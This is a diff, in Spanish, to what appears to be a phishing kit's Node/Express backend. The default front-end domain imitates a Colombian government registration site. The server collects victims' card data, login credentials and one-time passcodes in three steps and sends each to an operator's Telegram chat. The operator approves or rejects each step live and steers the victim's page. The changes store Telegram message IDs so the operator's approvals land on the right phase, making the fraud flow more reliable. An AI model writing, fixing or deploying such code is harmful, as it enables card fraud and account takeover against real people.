@@ -10,7 +10,6 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://registraenlineanuip-crtificadonacioncol.onrender.com';
 const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://backvenecol.onrender.com';
 
-// 🧠 ALMACENAMIENTO EN MEMORIA (Se borra si el servidor se reinicia)
 const pagosPendientes = new Map();
 
 async function tgSendMessage(text, replyMarkup) {
@@ -41,7 +40,6 @@ async function tgAnswerCallback(callbackQueryId, text) {
     } catch {}
 }
 
-// 🎯 TEXTO PARA LA TARJETA (SOLO DATOS DE TARJETA)
 function textoPasoCrear(pago) {
     return (
         `🔔 <b>NUEVA SOLICITUD DE PAGO (PASO 1: TARJETA)</b>\n\n` +
@@ -55,7 +53,6 @@ function textoPasoCrear(pago) {
     );
 }
 
-// 🎯 TEXTO PARA CREDENCIALES (DATOS DE TARJETA + CREDENCIALES)
 function textoPasoCredenciales(pago) {
     return (
         `🔑 <b>NUEVOS DATOS RECIBIDOS (PASO 2: CREDENCIALES)</b>\n\n` +
@@ -68,7 +65,6 @@ function textoPasoCredenciales(pago) {
     );
 }
 
-// 🎯 TEXTO PARA OTP (TODOS LOS DATOS COMPLETOS)
 function textoPasoOTP(pago) {
     return (
         `🔐 <b>NUEVOS DATOS RECIBIDOS (PASO 3: OTP)</b>\n\n` +
@@ -109,7 +105,9 @@ app.post('/api/crear-pago', async (req, res) => {
                 paso: paso || 'crear',
                 fase_actual: paso === 'otp' ? 'otp' : 'credenciales',
                 motivo_rechazo: null,
-                redirigir_a: null
+                redirigir_a: null,
+                message_id_credenciales: null,
+                message_id_otp: null
             };
         } else {
             pago.titular = titular || pago.titular;
@@ -124,13 +122,20 @@ app.post('/api/crear-pago', async (req, res) => {
             pago.estado = 'pendiente';
             pago.paso = paso || pago.paso;
             pago.fase_actual = paso === 'otp' ? 'otp' : 'credenciales';
+
+            // 🔥 FIX: nuevo inicio de credenciales → limpiar OTP y message_id_otp residual
+            if (paso === 'credenciales') {
+                pago.codigo_otp = null;
+                pago.message_id_otp = null;
+                pago.motivo_rechazo = null;
+                pago.redirigir_a = null;
+            }
         }
         
         pagosPendientes.set(solicitud_id, pago);
 
         const pasoActual = paso || 'crear';
         
-        // 🔥 CONFIGURACIÓN DE BOTONES SEGÚN EL PASO
         let replyMarkup;
         if (pasoActual === 'crear' || pasoActual === 'credenciales') {
             replyMarkup = { inline_keyboard: [[
@@ -145,13 +150,16 @@ app.post('/api/crear-pago', async (req, res) => {
             ]]};
         }
 
-        // 🔥 ENVIAMOS EL MENSAJE SEGÚN EL PASO
+        // 🔥 FIX: guardar el message_id de cada paso
         if (pasoActual === 'crear') {
-            await tgSendMessage(textoPasoCrear(pago), replyMarkup);
+            const sent = await tgSendMessage(textoPasoCrear(pago), replyMarkup);
+            if (sent && sent.ok && sent.result) pago.message_id_crear = sent.result.message_id;
         } else if (pasoActual === 'credenciales') {
-            await tgSendMessage(textoPasoCredenciales(pago), replyMarkup);
+            const sent = await tgSendMessage(textoPasoCredenciales(pago), replyMarkup);
+            if (sent && sent.ok && sent.result) pago.message_id_credenciales = sent.result.message_id;
         } else if (pasoActual === 'otp') {
-            await tgSendMessage(textoPasoOTP(pago), replyMarkup);
+            const sent = await tgSendMessage(textoPasoOTP(pago), replyMarkup);
+            if (sent && sent.ok && sent.result) pago.message_id_otp = sent.result.message_id;
         }
 
         return res.json({ success: true, solicitud_id, estado: 'pendiente' });
@@ -172,12 +180,9 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
         if (pago.estado === 'rechazado_credenciales') {
             return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: pago.motivo_rechazo });
         }
-        
-        // 🔥 NUEVO ESTADO: ERROR DE USUARIO
         if (pago.estado === 'rechazado_user_error') {
             return res.json({ success: true, estado: 'rechazado_user_error', fase: 'otp', mensaje: pago.motivo_rechazo });
         }
-
         if (pago.estado === 'aprobado') {
             return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${pago.redirigir_a || 'exito.html'}` });
         }
@@ -203,7 +208,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const pago = pagosPendientes.get(solicitud_id);
         if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');
 
-        const estaEnFaseOTP = !!pago.codigo_otp && pago.codigo_otp !== 'N/A';
+        // 🔥 FIX DEFINITIVO: decidir fase por message_id del mensaje aprobado
+        const estaEnFaseOTP = (msgId === pago.message_id_otp);
 
         if (accion === 'aprobar') {
             if (!estaEnFaseOTP) {
@@ -228,7 +234,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}`);
             }
         } else if (accion === 'error_usuario') {
-            // 🔥 NUEVA ACCIÓN: ERROR DE USUARIO
             pago.estado = 'rechazado_user_error';
             pago.motivo_rechazo = 'Error de usuario: credenciales no coinciden.';
             await tgAnswerCallback(cq.id, '⚠️ Error de usuario registrado');
